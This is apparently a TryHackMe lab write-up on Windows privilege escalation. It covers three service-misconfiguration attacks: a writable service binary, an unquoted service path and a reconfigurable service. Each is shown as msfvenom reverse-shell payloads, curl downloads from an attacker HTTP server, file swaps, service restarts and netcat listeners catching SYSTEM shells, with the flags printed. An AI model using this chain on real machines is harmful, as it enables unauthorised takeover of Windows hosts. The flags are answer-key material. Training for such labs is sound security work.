# About This Module
Module link: https://tryhackme.com/room/windowsprivesc20

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 07/10/2023

# Insecure Permissions on Service Executable

```PowerShell
C:\Users\thm-unpriv>sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: WindowsScheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr1
```

```PowerShell
C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

```Bash
root@ip-10-10-6-207:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.6.207 LPORT=9999 -f exe-service -o ReverseShell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 48640 bytes
Saved as: ReverseShell.exe
```

```Bash
root@ip-10-10-6-207:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```PowerShell
C:\Users\thm-unpriv>curl http://10.10.6.207:8000/ReverseShell.exe -O ReverseShell.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 48640  100 48640    0     0  48640      0  0:00:01 --:--:--  0:00:01  766k
curl: (6) Could not resolve host: ReverseShell.exe
```

```PowerShell
C:\PROGRA~2\SYSTEM~1>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\PROGRA~2\SYSTEM~1

[...]
03/25/2018  10:58 AM            98,720 WService.exe
[...]
              38 File(s)     11,144,869 bytes
               3 Dir(s)  14,788,710,400 bytes free
```

```PowerShell
C:\PROGRA~2\SYSTEM~1>move WService.exe WService.exe.bkp
        1 file(s) moved.
```

```PowerShell
C:\PROGRA~2\SYSTEM~1>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\PROGRA~2\SYSTEM~1

[...]
03/25/2018  10:58 AM            98,720 WService.exe.bkp
[...]
              38 File(s)     11,144,869 bytes
               3 Dir(s)  14,779,236,352 bytes free
```

```PowerShell
C:\PROGRA~2\SYSTEM~1>move C:\Users\thm-unpriv\ReverseShell.exe WService.exe
        1 file(s) moved.
```

```PowerShell
C:\PROGRA~2\SYSTEM~1>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\PROGRA~2\SYSTEM~1

[...]
08/04/2023  03:56 PM            48,640 WService.exe
03/25/2018  10:58 AM            98,720 WService.exe.bkp
[...]
              39 File(s)     11,193,573 bytes
               3 Dir(s)  14,755,926,016 bytes free
```

```PowerShell
C:\PROGRA~2\SYSTEM~1>icacls WService.exe /grant Everyone:F
processed file: WService.exe
Successfully processed 1 files; Failed processing 0 files
```

```Bash
root@ip-10-10-6-207:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```

```PowerShell
C:\PROGRA~2\SYSTEM~1>sc stop WindowsScheduler

SERVICE_NAME: WindowsScheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3508
        FLAGS              :
```

```PowerShell
C:\PROGRA~2\SYSTEM~1>sc start WindowsScheduler

SERVICE_NAME: WindowsScheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3508
        FLAGS              :
```

```Bash
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.124.176 49783 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

```PowerShell
C:\Windows\system32>type C:\Users\svcusr1\Desktop\flag.txt     
type C:\Users\svcusr1\Desktop\flag.txt
THM{AT_YOUR_SERVICE}
```

# Unquoted Service Paths

```PowerShell
C:\Users\thm-unpriv>icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

```Bash
root@ip-10-10-6-207:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.6.207 LPORT=9999 -f exe-service -o ReverseShell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 48640 bytes
Saved as: ReverseShell.exe
```

```Bash
root@ip-10-10-6-207:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```PowerShell
C:\Users\thm-unpriv>curl http://10.10.6.207:8000/ReverseShell.exe -O ReverseShell.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 48640  100 48640    0     0  48640      0  0:00:01 --:--:--  0:00:01 1484k
curl: (6) Could not resolve host: ReverseShell.exe
```

```PowerShell
C:\Users\thm-unpriv>move C:\Users\thm-unpriv\ReverseShell.exe C:\MyPrograms\Disk.exe
        1 file(s) moved.
```

```PowerShell
C:\Users\thm-unpriv>icacls C:\MyPrograms\Disk.exe /grant Everyone:F
processed file: C:\MyPrograms\Disk.exe
Successfully processed 1 files; Failed processing 0 files
```

```Bash
root@ip-10-10-6-207:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```

```Powershell
C:\Users\thm-unpriv>sc stop "disk sorter enterprise"

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

```PowerShell
C:\Users\thm-unpriv>sc start "disk sorter enterprise"

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 936
        FLAGS              :
```

```Bash
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.165.129 49761 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

```PowerShell
C:\Windows\system32>type C:\Users\svcusr2\Desktop\flag.txt
type C:\Users\svcusr2\Desktop\flag.txt
THM{QUOTES_EVERYWHERE}
```

# Insecure Service Permissions

```PowerShell
C:\Users\thm-unpriv>C:\tools\AccessChk\accesschk64.exe -qlc thmservice

Accesschk v6.14 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

thmservice
  DESCRIPTOR FLAGS:
      [SE_DACL_PRESENT]
      [SE_SACL_PRESENT]
      [SE_SELF_RELATIVE]
  OWNER: NT AUTHORITY\SYSTEM
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [1] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  [2] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\INTERACTIVE
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [3] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SERVICE
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
```

```Bash
root@ip-10-10-6-207:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.6.207 LPORT=9999 -f exe-service -o ReverseShell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 48640 bytes
Saved as: ReverseShell.exe
```

```Bash
root@ip-10-10-6-207:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```PowerShell
C:\Users\thm-unpriv>curl http://10.10.6.207:8000/ReverseShell.exe -O ReverseShell.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 48640  100 48640    0     0  48640      0  0:00:01 --:--:--  0:00:01 1532k
curl: (6) Could not resolve host: ReverseShell.exe
```

```PowerShell
C:\Users\thm-unpriv>icacls C:\Users\thm-unpriv\ReverseShell.exe /grant Everyone:F
processed file: C:\Users\thm-unpriv\ReverseShell.exe
Successfully processed 1 files; Failed processing 0 files
```

```PowerShell
C:\Users\thm-unpriv>sc config THMService binPath= "C:\Users\thm-unpriv\ReverseShell.exe" obj= LocalSystem
[SC] ChangeServiceConfig SUCCESS
```

```Bash
root@ip-10-10-6-207:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```

```PowerShell
C:\Users\thm-unpriv>sc stop THMService
[SC] ControlService FAILED 1062:

The service has not been started.
```

```PowerShell
C:\Users\thm-unpriv>sc start THMService

SERVICE_NAME: THMService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 3884
        FLAGS              :
```

```Bash
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.165.129 49902 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

```PowerShell
C:\Windows\system32>type C:\Users\Administrator\Desktop\flag.txt
type C:\Users\Administrator\Desktop\flag.txt
THM{INSECURE_SVC_CONFIG}
```
